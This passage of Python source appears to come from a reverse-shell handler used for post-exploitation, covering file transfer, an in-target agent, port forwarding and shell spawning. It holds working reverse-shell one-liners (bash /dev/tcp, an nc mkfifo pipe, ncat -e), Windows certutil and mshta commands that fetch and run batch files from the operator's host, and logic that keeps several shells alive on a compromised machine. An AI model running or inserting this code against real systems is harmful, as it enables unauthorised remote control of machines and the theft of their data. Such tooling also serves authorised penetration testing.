                    logger.error(response)
                    return []
            else:
                cmd = f"du -ck {remote_items}"
                response = self.exec(cmd, timeout=None, value=True)
                if not response:
                    logger.error("Cannot determine remote size")
                    return []
                #errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
                #for error in errors:
                #    logger.error(error)
                remote_size = int(response.splitlines()[-1].split()[0]) * 1024

            need = remote_size - available_bytes

            if need > 0:
                logger.error(
                    f"--- Not enough space to download... {paint('We need ').blue}"
                    f"{paint().yellow}{need:,}{paint().blue} more bytes..."
                )
                return []

            # Packing and downloading
            if self.agent:
                stdin_stream = self.new_streamID
                stdout_stream = self.new_streamID
                stderr_stream = self.new_streamID

                if not all([stdout_stream, stderr_stream]):
                    return

                code = fr"""
                from glob import glob
                normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
                items = []
                for part in shlex.split({repr(remote_items)}):
                    _items = glob(normalize_path(part))
                    if _items:
                        items.extend(_items)
                    else:
                        items.append(part)
                import tarfile
                if hasattr(tarfile, 'DEFAULT_FORMAT'):
                    tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
                else:
                    tarfile.TarFile.posix = True
                tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream)
                def handle_exceptions(func):
                    def inner(*args, **kwargs):
                        try:
                            func(*args, **kwargs)
                        except:
                            stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
                    return inner
                tar.add = handle_exceptions(tar.add)
                for item in items:
                    try:
                        tar.add(os.path.abspath(item))
                    except:
                        stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
                tar.close()
                """

                threading.Thread(target=self.exec, args=(code, ), kwargs={
                    'python': True,
                    'stdin_stream': stdin_stream,
                    'stdout_stream': stdout_stream,
                    'stderr_stream': stderr_stream
                }).start()

                error_buffer = ''
                while True:
                    r, _, _ = select([stderr_stream], [], [])
                    data = stderr_stream.read(options.network_buffer_size)
                    if data:
                        error_buffer += data.decode()
                        while '\n' in error_buffer:
                            line, error_buffer = error_buffer.split('\n', 1)
                            logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
                    else:
                        break

                tar_source, mode = stdout_stream, "r|gz"
            else:
                remote_items = ' '.join([os.path.join(self.cwd, part) for part in shlex.split(remote_items)])
                temp = self.tmp + "/" + rand(8)
                cmd = rf'tar -czf - -h {remote_items}|base64|tr -d "\n" > {temp}'
                response = self.exec(cmd, timeout=None, value=True)
                if response is False:
                    logger.error("Cannot create archive")
                    return []
                errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
                for error in errors:
                    logger.error(error)
                send_size = int(self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))

                b64data = io.BytesIO()
                for offset in range(0, send_size, options.download_chunk_size):
                    response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
                    if response is False:
                        logger.error("Download interrupted")
                        return []
                    b64data.write(response)
                self.exec(f"rm {temp}")

                data = io.BytesIO()
                data.write(base64.b64decode(b64data.getvalue()))
                data.seek(0)

                tar_source, mode = data, "r:gz"

            #print(remote_size)
            #if not remote_size:
            #    return []

            # Local extraction
            try:
                tar = tarfile.open(mode=mode, fileobj=tar_source)
            except:
                logger.error("Invalid data returned")
                return []

            def add_w(func):
                def inner(*args, **kwargs):
                    args[0].mode |= 0o200
                    func(*args, **kwargs)
                return inner

            tar._extract_member = add_w(tar._extract_member)

            with warnings.catch_warnings():
                warnings.simplefilter("ignore", category=DeprecationWarning)
                try:
                    tar.extractall(local_download_folder)
                except Exception as e:
                    logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
            tar.close()

            if self.agent:
                stdin_stream.write(b"")
                os.close(stdin_stream._read)
                os.close(stdin_stream._write)
                del self.streams[stdin_stream.id]
                os.close(stdout_stream._read)
                del self.streams[stdout_stream.id]
                del self.streams[stderr_stream.id]

                # Get the remote absolute paths
                response = self.exec(f"""
                from glob import glob
                normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
                remote_paths = ''
                for part in shlex.split({repr(remote_items)}):
                    result = glob(normalize_path(part))
                    if result:
                        for item in result:
                            if os.path.exists(item):
                                remote_paths += os.path.abspath(item) + "\\n"
                    else:
                        remote_paths += part + "\\n"
                stdout_stream << remote_paths.encode()
                """, python=True, value=True)
            else:
                cmd = f'for file in {remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo "$file"; fi; done'
                response = self.exec(cmd, timeout=None, value=True)
                if not response:
                    logger.error("Cannot get remote paths")
                    return []

            remote_paths = response.splitlines()

            # Present the downloads
            downloaded = []
            for path in remote_paths:
                local_path = local_download_folder / path[1:]
                if os.path.isabs(path) and os.path.exists(local_path):
                    downloaded.append(local_path)
                else:
                    logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(pathlink(item)).yellow}")

        elif self.OS == 'Windows':
            remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
            tempfile_bat = f'/dev/shm/{rand(16)}.bat'
            remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
            cmd = (
                f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
                ' -DestinationPath $archivepath;'
                '$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
                'Remove-Item $archivepath;'
                'Write-Host $b64"'
            )
            with open(tempfile_bat, "w") as f:
                f.write(cmd)

            server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
            urlpath_bat = server.add(tempfile_bat)
            temp_remote_file_bat = urlpath_bat.split("/")[-1]
            server.start()
            response = self.exec(
                f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
                f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
                f'del "%TEMP%\\{temp_remote_file_bat}"',
                force_cmd=True, value=True, timeout=None)
            server.stop()

            if not response:
                return []
            downloaded = set()
            try:
                with zipfile.ZipFile(io.BytesIO(base64.b64decode(response)), 'r') as zipdata:
                    for item in zipdata.infolist():
                        item.filename = item.filename.replace('\\', '/')
                        downloaded.add(Path(local_download_folder) / Path(item.filename.split('/')[0]))
                        newpath = Path(zipdata.extract(item, path=local_download_folder))

            except zipfile.BadZipFile:
                logger.error("Invalid zip format")

            except binascii_error:
                logger.error("The item does not exist or access is denied")

        for item in downloaded:
            logger.info(f"{paint('Download OK').GREEN_white} {paint(shlex.quote(pathlink(item))).yellow}")

        return downloaded

    def upload(self, local_items, remote_path=None, randomize_fname=False):

        # Check remote permissions
        destination = remote_path or self.cwd
        try:
            if self.OS == 'Unix':
                if self.agent:
                    if not eval(self.exec(
                        f"stdout_stream << str(os.access('{destination}', os.W_OK)).encode()",
                        python=True,
                        value=True
                    )):
                        logger.error(f"{destination}: Permission denied")
                        return []
                else:
                    if int(self.exec(f"[ -w \"{destination}\" ];echo $?", value=True)):
                        logger.error(f"{destination}: Permission denied")
                        return []
            elif self.OS == 'Windows':
                pass # TODO
        except Exception as e:
            logger.error(e)
            logger.warning("Cannot check remote permissions. Aborting...")
            return []

        # Initialization
        try:
            local_items = [item if re.match(r'(http|ftp)s?://', item, re.IGNORECASE)\
                 else normalize_path(item) for item in shlex.split(local_items)]

        except ValueError as e:
            logger.error(e)
            return []

        # Check for necessary binaries
        if self.OS == 'Unix' and not self.agent:
            dependencies = ['echo', 'base64', 'tar', 'rm']
            for binary in dependencies:
                if not self.bin[binary]:
                    logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
                    return []

        # Resolve items
        resolved_items = []
        for item in local_items:
            # Download URL
            if re.match(r'(http|ftp)s?://', item, re.IGNORECASE):
                try:
                    filename, item = url_to_bytes(item)
                    if not item:
                        continue
                    resolved_items.append((filename, item))
                except Exception as e:
                    logger.error(e)
            else:
                if os.path.isabs(item):
                    items = list(Path('/').glob(item.lstrip('/')))
                else:
                    items = list(Path().glob(item))
                if items:
                    resolved_items.extend(items)
                else:
                    logger.error(f"No such file or directory: {item}")

        if not resolved_items:
            return []

        if self.OS == 'Unix':
            # Get remote available space
            if self.agent:
                response = self.exec(f"""
                stats = os.statvfs('{destination}')
                stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
                """, python=True, value=True)

                remote_available_blocks, remote_block_size = map(int, response.split(';'))
                remote_space = remote_available_blocks * remote_block_size
            else:
                remote_block_size = int(self.exec(rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}', value=True))
                remote_space = int(self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)) * 1024

            # Calculate local size
            local_size = 0
            for item in resolved_items:
                if isinstance(item, tuple):
                    local_size += ceil(len(item[1]) / remote_block_size) * remote_block_size
                else:
                    local_size += get_glob_size(str(item), remote_block_size)

            # Check required space
            need = local_size - remote_space
            if need > 0:
                logger.error(
                    f"--- Not enough space on target... {paint('We need ').blue}"
                    f"{paint().yellow}{need:,}{paint().blue} more bytes..."
                )
                return []

            # Start Uploading
            if self.agent:
                stdin_stream = self.new_streamID
                stdout_stream = self.new_streamID
                stderr_stream = self.new_streamID

                if not all([stdin_stream, stdout_stream, stderr_stream]):
                    return

                code = rf"""
                import tarfile
                if hasattr(tarfile, 'DEFAULT_FORMAT'):
                    tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
                tar = tarfile.open(name='', mode='r|gz', fileobj=stdin_stream)
                tar.errorlevel = 1
                for item in tar:
                    try:
                        tar.extract(item, path='{destination}')
                    except:
                        stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
                tar.close()
                """
                threading.Thread(target=self.exec, args=(code, ), kwargs={
                    'python': True,
                    'stdin_stream': stdin_stream,
                    'stdout_stream': stdout_stream,
                    'stderr_stream': stderr_stream
                }).start()

                tar_destination, mode = stdin_stream, "r|gz"
            else:
                tar_buffer = io.BytesIO()
                tar_destination, mode = tar_buffer, "r:gz"

            tar = tarfile.open(mode='w|gz', fileobj=tar_destination)

            def handle_exceptions(func):
                def inner(*args, **kwargs):
                    try:
                        func(*args, **kwargs)
                    except Exception as e:
                        logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
                return inner
            tar.add = handle_exceptions(tar.add)

            altnames = []
            for item in resolved_items:
                if isinstance(item, tuple):
                    filename, data = item

                    if randomize_fname:
                        filename = Path(filename)
                        altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
                    else:
                        altname = filename

                    file = tarfile.TarInfo(name=altname)
                    file.size = len(data)
                    file.mode = 0o770
                    file.mtime = int(time.time())

                    tar.addfile(file, io.BytesIO(data))
                else:
                    altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
                    tar.add(item, arcname=altname)
                altnames.append(altname)
            tar.close()

            if self.agent:
                stdin_stream.write(b"")
                error_buffer = ''
                while True:
                    r, _, _ = select([stderr_stream], [], [])
                    data = stderr_stream.read(options.network_buffer_size)
                    if data:
                        error_buffer += data.decode()
                        while '\n' in error_buffer:
                            line, error_buffer = error_buffer.split('\n', 1)
                            logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
                    else:
                        break
                os.close(stdin_stream._read)
                os.close(stdin_stream._write)
                os.close(stdout_stream._read)
                del self.streams[stdin_stream.id]
                del self.streams[stdout_stream.id]
                del self.streams[stderr_stream.id]

            else: # TODO
                tar_buffer.seek(0)
                data = base64.b64encode(tar_buffer.read()).decode()
                temp = self.tmp + "/" + rand(8)

                for chunk in chunks(data, options.upload_chunk_size):
                    response = self.exec(f"printf {chunk} >> {temp}")
                    if response is False:
                        #progress_bar.terminate()
                        logger.error("Upload interrupted")
                        return [] # TODO
                    #progress_bar.update(len(chunk))

                #logger.info(paint("--- Remote unpacking...").blue)
                dest = f"-C {remote_path}" if remote_path else ""
                cmd = f"base64 -d < {temp} | tar xz {dest} 2>&1; temp=$?"
                response = self.exec(cmd, value=True)
                exit_code = int(self.exec("echo $temp", value=True))
                self.exec(f"rm {temp}")
                if exit_code:
                    logger.error(response)
                    return [] # TODO

        elif self.OS == 'Windows':
            tempfile_zip = f'/dev/shm/{rand(16)}.zip'
            tempfile_bat = f'/dev/shm/{rand(16)}.bat'
            with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
                altnames = []
                for item in resolved_items:
                    if isinstance(item, tuple):
                        filename, data = item
                        if randomize_fname:
                            filename = Path(filename)
                            altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
                        else:
                            altname = filename
                        zip_info = zipfile.ZipInfo(filename=str(altname))
                        zip_info.date_time = time.localtime(time.time())[:6]
                        myzip.writestr(zip_info, data)
                    else:
                        altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
                        myzip.write(item, arcname=altname)
                    altnames.append(altname)

            server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
            urlpath_zip = server.add(tempfile_zip)

            cwd_escaped = self.cwd.replace('\\', '\\\\')
            tmp_escaped = self.tmp.replace('\\', '\\\\')
            temp_remote_file_zip = urlpath_zip.split("/")[-1]

            fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
            unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'

            with open(tempfile_bat, "w") as f:
                f.write(fetch_cmd + "\n")
                f.write(unzip_cmd)

            urlpath_bat = server.add(tempfile_bat)
            temp_remote_file_bat = urlpath_bat.split("/")[-1]
            server.start()
            response = self.exec(
                f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
                force_cmd=True, value=True, timeout=None)
            server.stop()
            if not response:
                logger.error("Upload initialization failed...")
                return []
            if not "DOWNLOAD OK" in response:
                logger.error("Data transfer failed...")
                return []
            if not "UNZIP OK" in response:
                logger.error("Data unpacking failed...")
                return []

        # Present uploads
        uploaded_paths = []
        for item in altnames:
            if self.OS == "Unix":
                uploaded_path = shlex.quote(str(Path(destination) / item))
            elif self.OS == "Windows":
                uploaded_path = f'"{PureWindowsPath(destination, item)}"'
            logger.info(f"{paint('Upload OK').GREEN_white} {paint(uploaded_path).yellow}")
            uploaded_paths.append(uploaded_path)
            print()

        return uploaded_paths

    @agent_only
    def script(self, local_script):

        local_script_folder = self.directory / "scripts"
        prefix = datetime.now().strftime("%Y_%m_%d-%H_%M_%S-")

        try:
            local_script_folder.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            logger.error(e)
            return False

        if re.match(r'(http|ftp)s?://', local_script, re.IGNORECASE):
            try:
                filename, data = url_to_bytes(local_script)
                if not data:
                    return False
            except Exception as e:
                logger.error(e)

            local_script = local_script_folder / (prefix + filename)
            with open(local_script, "wb") as input_file:
                input_file.write(data)
        else:
            local_script = Path(normalize_path(local_script))

        output_file_name = local_script_folder / (prefix + "output.txt")

        try:
            input_file = open(local_script, "rb")
            output_file = open(output_file_name, "wb")
            first_line = input_file.readline().strip()
            #input_file.seek(0) # Maybe it is not needed
            if first_line.startswith(b'#!'):
                program = first_line[2:].decode()
            else:
                logger.error("No shebang found")
                return False

            tail_cmd = f'tail -n+0 -f {output_file_name}'
            print(tail_cmd)
            Open(tail_cmd, terminal=True)

            thread = threading.Thread(target=self.exec, args=(program, ), kwargs={
                'stdin_src': input_file,
                'stdout_dst': output_file,
                'stderr_dst': output_file
            })
            thread.start()

        except Exception as e:
            logger.error(e)
            return False

        return output_file_name

    def spawn(self, port=None, host=None):

        if self.OS == "Unix":
            if any([self.listener, port, host]):

                port = port or self._port
                host = host or self._host

                if not next((listener for listener in core.listeners.values() if listener.port == port), None):
                    new_listener = TCPListener(host, port)

                if self.bin['bash']:
                    cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
                elif self.bin['nc'] and self.bin['sh']:
                    cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
                elif self.bin['sh']:
                    ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
                    ncat_binary = self.tmp + '/ncat'
                    if not self.exec(f"test -f {ncat_binary} || echo x"):
                        cmd = ncat_cmd.format(ncat_binary)
                    else:
                        logger.warning("ncat is not available on the target")
                        ncat_binary = self.need_binary(
                            "ncat",
                            URLS['ncat']
                            )
                        if ncat_binary:
                            cmd = ncat_cmd.format(ncat_binary)
                        else:
                            logger.error("Spawning shell aborted")
                            return False
                else:
                    logger.error("No available shell binary is present...")
                    return False

                logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
                self.exec(cmd)

                # TODO maybe destroy the new_listener upon getting a shell?
                # if new_listener:
                #    new_listener.stop()
            else:
                host, port = self.socket.getpeername()
                logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
                if not Connect(host, port):
                    logger.info("Spawn bind shell failed. I will try getting a reverse shell...")
                    return self.spawn(port, self._host)

        elif self.OS == 'Windows':
            logger.warning("Spawn Windows shells is not implemented yet")
            return False

        return True

    @agent_only
    def portfwd(self, _type, lhost, lport, rhost, rport):

        session = self
        control = ControlQueue()
        stop = threading.Event()
        task = [(_type, lhost, lport, rhost, rport), control, stop]

        class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
            def handle(self):

                self.request.setblocking(False)
                stdin_stream = session.new_streamID
                stdout_stream = session.new_streamID
                stderr_stream = session.new_streamID

                if not all([stdin_stream, stdout_stream, stderr_stream]):
                    return

                code = rf"""
                import socket
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                frlist = [stdin_stream]
                connected = False
                while True:
                    readables, _, _ = select(frlist, [], [])

                    for readable in readables:
                        if readable is stdin_stream:
                            data = stdin_stream.read({options.network_buffer_size})
                            if not connected:
                                client.connect(("{rhost}", {rport}))
                                client.setblocking(False)
                                frlist.append(client)
                                connected = True
                            try:
                                client.sendall(data)
                            except OSError:
                                break
                            if not data:
                                frlist.remove(stdin_stream)
                                break
                        if readable is client:
                            try:
                                data = client.recv({options.network_buffer_size})
                                stdout_stream.write(data)
                                if not data:
                                    frlist.remove(client) # TEMP
                                    break
                            except OSError:
                                frlist.remove(client) # TEMP
                                break
                    else:
                        continue
                    break
                #client.shutdown(socket.SHUT_RDWR)
                client.close()
                """
                session.exec(
                    code,
                    python=True,
                    stdin_stream=stdin_stream,
                    stdout_stream=stdout_stream,
                    stderr_stream=stderr_stream,
                    stdin_src=self.request,
                    stdout_dst=self.request,
                    agent_control=control
                )
                os.close(stderr_stream._read) #TEMP

        class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
            allow_reuse_address = True
            request_queue_size = 100

            @handle_bind_errors
            def server_bind(self, lhost, lport):
                self.server_address = (lhost, int(lport))
                super().server_bind()

        def server_thread():
            with ThreadedTCPServer(None, ThreadedTCPRequestHandler, bind_and_activate=False) as server:
                if not server.server_bind(lhost, lport):
                    return False
                server.server_activate()
                task.append(server)
                logger.info(f"Setup Port Forwarding: {lhost}:{lport} {'->' if _type=='L' else '<-'} {rhost}:{rport}")
                session.tasks['portfwd'].append(task)
                server.serve_forever()
            stop.set()

        portfwd_thread = threading.Thread(target=server_thread)
        task.append(portfwd_thread)
        portfwd_thread.start()

    def maintain(self):
        with core.lock:
            current_num = len(core.hosts[self.name]) if core.hosts else 0
            if 0 < current_num < options.maintain:
                session = core.hosts[self.name][-1]
                logger.warning(paint(
                        f" --- Session {session.id} is trying to maintain {options.maintain} "
                        f"active shells on {self.name} ---"
                    ).blue)
                return session.spawn()
        return False

    def kill(self):
        if self not in core.rlist:
            return True

        if menu.sid == self.id:
            menu.set_id(None)

        thread_name = threading.current_thread().name
        logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")

        if thread_name != 'Core':
            if self.OS:
                if self.host_needs_control_session and\
                    not self.spare_control_sessions and\
                    self.control_session is self:

                    sessions = ', '.join([str(session.id) for session in self.host_needs_control_session])
                    logger.warning(f"Cannot kill Session {self.id} as the following sessions depend on it: [{sessions}]")
                    return False

                for module in modules().values():
                    if module.enabled and module.on_session_end:
                     module.run(self)
            else:
                self.id = randint(10**10, 10**11-1)
                core.sessions[self.id] = self

            core.control << f'self.sessions[{self.id}].kill()'
            return

        self.subchannel.control.close()
        self.subchannel.close()

        core.rlist.remove(self)
        if self in core.wlist:
            core.wlist.remove(self)
        try:
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0)) # RST
            #self.socket.shutdown(socket.SHUT_RDWR) # FIN
        except OSError:
            pass
        self.socket.close()

        if not self.OS:
            message = f"Invalid shell from {self.ip} 🙄"
        else:
            message = f"Session [{self.id}] died..."
            core.hosts[self.name].remove(self)
            if not core.hosts[self.name]:
                message += f" We lost {self.name_colored} 💔"
                del core.hosts[self.name]

        if self.id in core.sessions:
            del core.sessions[self.id]
        logger.error(message)

        if hasattr(self, 'logfile'):
            self.logfile.close()

        if self.is_attached:
            self.detach()

        for portfwd in self.tasks['portfwd']:
            info, control, stop, thread, server = portfwd
            logger.warning(f"Stopping Port Forwarding: {info[1]}:{info[2]} {'->' if info[0]=='L' else '<-'} {info[3]}:{info[4]}")
            server.shutdown()
            server.server_close()
            while not stop.is_set(): # TEMP
                control << "stop"
            thread.join()

        if self.OS:
            threading.Thread(target=self.maintain).start()
        return True




def agent():
    import os
    import sys
    import pty
    import shlex
    import fcntl
    import struct
    import signal
    import termios
    import threading
    from select import select
    signal.signal(signal.SIGINT, signal.SIG_DFL)
    signal.signal(signal.SIGQUIT, signal.SIG_DFL)

    if sys.version_info[0] == 2:
        import Queue as queue
    else:
        import queue
    try:
        import io
        bufferclass = io.BytesIO
    except:
        import StringIO
        bufferclass = StringIO.StringIO

    SHELL = "{}"
    NET_BUF_SIZE = {}
    {}
    {}

    def respond(_value, _type=Messenger.STREAM):
        wlock.acquire()
        outbuf.seek(0, 2)
        outbuf.write(Messenger.message(_type, _value))
        if not pty.STDOUT_FILENO in wlist:
            wlist.append(pty.STDOUT_FILENO)
            os.write(control_in, "1".encode())
        wlock.release()

    def cloexec(fd):
        try:
            flags = fcntl.fcntl(fd, fcntl.F_GETFD)
            fcntl.fcntl(fd, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)
        except:
            pass

    shell_pid, master_fd = pty.fork()
    if shell_pid == pty.CHILD:
        os.execl(SHELL, SHELL, '-i')
    try:
        pty.setraw(pty.STDIN_FILENO)
    except:
        pass

    try:
        streams = dict()
        messenger = Messenger(bufferclass)
        outbuf = bufferclass()
        ttybuf = bufferclass()

        wlock = threading.Lock()
        control_out, control_in = os.pipe()
        cloexec(control_out)
        cloexec(control_in)

        rlist = [control_out, master_fd, pty.STDIN_FILENO]
        wlist = []
        for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO, pty.STDERR_FILENO): # TODO
            flags = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
            cloexec(fd)

        while True:
            rfds, wfds, _ = select(rlist, wlist, [])

            for readable in rfds:
                if readable is control_out:
                    os.read(control_out, 1)

                elif readable is master_fd:
                    try:
                        data = os.read(master_fd, NET_BUF_SIZE)
                    except:
                        data = ''.encode()
                    respond(data, Messenger.SHELL)
                    if not data:
                        rlist.remove(master_fd)
                        try:
                            os.close(master_fd)
                        except:
                            pass

                elif readable is pty.STDIN_FILENO:
                    try:
                        data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
                    except:
                        data = None
                    if not data:
                        rlist.remove(pty.STDIN_FILENO)
                        break

                    messages = messenger.feed(data)
                    for _type, _value in messages:
                        if _type == Messenger.SHELL:
                            ttybuf.seek(0, 2)
                            ttybuf.write(_value)
                            if not master_fd in wlist:
                                wlist.append(master_fd)

                        elif _type == Messenger.RESIZE:
                            fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)

                        elif _type == Messenger.EXEC:
                            sb = str(Messenger.STREAM_BYTES)
                            header_size = 1 + int(sb) * 3
                            __type, stdin_stream_id, stdout_stream_id, stderr_stream_id = struct.unpack(
                                '!c' + (sb + 's') * 3,
                                _value[:header_size]
                            )
                            cmd = _value[header_size:]

                            if not stdin_stream_id in streams:
                                streams[stdin_stream_id] = Stream(stdin_stream_id)
                            if not stdout_stream_id in streams:
                                streams[stdout_stream_id] = Stream(stdout_stream_id)
                            if not stderr_stream_id in streams:
                                streams[stderr_stream_id] = Stream(stderr_stream_id)

                            stdin_stream = streams[stdin_stream_id]
                            stdout_stream = streams[stdout_stream_id]
                            stderr_stream = streams[stderr_stream_id]

                            rlist.append(stdout_stream)
                            rlist.append(stderr_stream)

                            if __type == 'S'.encode():
                                pid = os.fork()
                                if pid == 0:
                                    os.dup2(stdin_stream._read, 0)
                                    os.dup2(stdout_stream._write, 1)
                                    os.dup2(stderr_stream._write, 2)
                                    os.execl("{}", "sh", "-c", cmd)
                                    os._exit(1)
                                os.close(stdin_stream._read)
                                os.close(stdout_stream._write)
                                os.close(stderr_stream._write)

                            elif __type == 'P'.encode():
                                def run(stdin_stream, stdout_stream, stderr_stream):
                                    try:
                                        {}
                                    except:
                                        stderr_stream << (str(sys.exc_info()[1]) + "\n").encode()
                                    try:
                                        os.close(stdin_stream._read)
                                    except:
                                        pass

                                    #if stdin_stream_id in streams:
                                    #    del streams[stdin_stream_id]
                                    stdout_stream << "".encode()
                                    stderr_stream << "".encode()
                                threading.Thread(target=run, args=(stdin_stream, stdout_stream, stderr_stream)).start()

                        # Incoming streams
                        elif _type == Messenger.STREAM:
                            stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
                            if not stream_id in streams:
                                streams[stream_id] = Stream(stream_id)
                            streams[stream_id] << data

                # Outgoing streams
                else:
                    data = readable.read(NET_BUF_SIZE)
                    readable.write(data)
                    if not data:
                        rlist.remove(readable)
                        del streams[readable.id]

            else:
                for writable in wfds:

                    if writable is pty.STDOUT_FILENO:
                        sendbuf = outbuf
                        wlock.acquire()

                    elif writable is master_fd:
                        sendbuf = ttybuf

                    try:
                        sent = os.write(writable, sendbuf.getvalue())
                    except OSError:
                        wlist.remove(writable)
                        if sendbuf is outbuf:
                         wlock.release()
                        continue

                    sendbuf.seek(sent)
                    remaining = sendbuf.read()
                    sendbuf.seek(0)
                    sendbuf.truncate()
                    sendbuf.write(remaining)
                    if not remaining:
                        wlist.remove(writable)
                    if sendbuf is outbuf:
                        wlock.release()
                continue
            break
    except:
        _, e, t = sys.exc_info()
        import traceback
        traceback.print_exc()
        traceback.print_stack()
    try:
        os.close(master_fd)
    except:
        pass
    os.waitpid(shell_pid, 0)[1]
    os.kill(os.getppid(), signal.SIGKILL) # TODO


def modules():
    # Backward-compatibility accessor; prefer penelope_mod.plugins.discover()
    return discover()



def WinResize(num, stack):
    if core.attached_session is not None and core.attached_session.type == "PTY":
        core.attached_session.update_pty_size()



def get_glob_size(_glob, block_size):
    from glob import glob
    from math import ceil
    normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
    def size_on_disk(filepath):
        try:
            return ceil(float(os.lstat(filepath).st_size) / block_size) * block_size
        except:
            return 0
    total_size = 0
    for part in shlex.split(_glob):
        for item in glob(normalize_path(part)):
            if os.path.isfile(item):
                total_size += size_on_disk(item)
            elif os.path.isdir(item):
                for root, dirs, files in os.walk(item):
                    for file in files:
                        filepath = os.path.join(root, file)
                        total_size += size_on_disk(filepath)
    return total_size

def url_to_bytes(URL):

    # URLs with special treatment
    URL = re.sub(
        r"https://www.exploit-db.com/exploits/",
        "https://www.exploit-db.com/download/",
        URL
    )

    req = Request(URL, headers={'User-Agent': options.useragent})

    logger.trace(paint(f"Download URL: {URL}").cyan)
    ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()

    while True:
        try:
            response = urlopen(req, context=ctx, timeout=options.short_timeout)
            break
        except (HTTPError, TimeoutError) as e:
            logger.error(e)
        except URLError as e:
            logger.error(e.reason)
            if (hasattr(ssl, 'SSLCertVerificationError') and type(e.reason) == ssl.SSLCertVerificationError) or\
                (isinstance(e.reason, ssl.SSLError) and "CERTIFICATE_VERIFY_FAILED" in str(e)):
                answer = ask("Cannot verify SSL Certificate. Download anyway? (y/N): ")
                if answer.lower() == 'y': # Trust the cert
                    ctx = ssl._create_unverified_context()
                    continue
            else:
                answer = ask("Connection error. Try again? (Y/n): ")
                if answer.lower() == 'n': # Trust the cert
                    pass
                else:
                    continue
        return None, None

    filename = response.headers.get_filename()
    if filename:
        filename = filename.strip('"')
    elif URL.split('/')[-1]:
        filename = URL.split('/')[-1]
    else:
        filename = URL.split('/')[-2]

    size = int(response.headers.get('Content-Length'))
    data = bytearray()
    pbar = PBar(size, caption=f" {paint('⤷').cyan} ", barlen=40, metric=Size)
    while True:
        try:
            chunk = response.read(options.network_buffer_size)
            if not chunk:
                break
            data.extend(chunk)
            pbar.update(len(chunk))
        except Exception as e:
            logger.error(e)
            pbar.terminate()
            break

    return filename, data

def check_urls():
    global URLS
    urls = URLS.values()
    space_num = len(max(urls, key=len))
    all_ok = True
    for url in urls:
        req = Request(url, method="HEAD", headers={'User-Agent': options.useragent})
